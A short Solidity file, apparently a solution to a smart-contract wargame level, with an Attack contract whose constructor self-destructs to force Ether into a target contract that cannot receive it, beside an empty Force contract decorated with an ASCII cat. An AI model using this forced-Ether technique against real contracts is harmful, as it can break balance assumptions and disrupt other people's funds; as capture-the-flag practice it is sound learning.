// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    Force force;

    constructor(address payable  _forceHackAddr) payable {
        selfdestruct(_forceHackAddr);

    }

}

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
